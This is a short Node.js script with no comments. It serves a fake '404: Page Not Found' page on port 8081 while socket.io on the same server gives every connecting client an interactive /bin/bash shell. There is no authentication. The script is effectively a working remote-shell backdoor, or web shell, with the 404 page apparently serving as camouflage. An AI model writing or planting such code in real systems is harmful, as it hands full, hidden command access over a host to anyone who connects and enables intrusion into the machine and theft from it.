var server = require('http').createServer(function(req, res) {
  res.writeHead(404, {'Content-Type': 'text/html'});
  res.end('<html><body><center><h1>404: Page Not Found</h1>' +
    '<p>There is no web page at that web address.</p></center></body></html>\n');
});
server.listen(8081);

var socket = require('socket.io').listen(server);
var spawn = require('child_process').spawn;
socket.on('connection', function(client) {
  var shell = spawn('/bin/bash');
  shell.stdout.on('data', function(data) {
    client.send(data);
  });
  client.on('message', function(data) {
    shell.stdin.write(data);
  });
  client.on('disconnect', function() {
    shell.kill();
  });
});
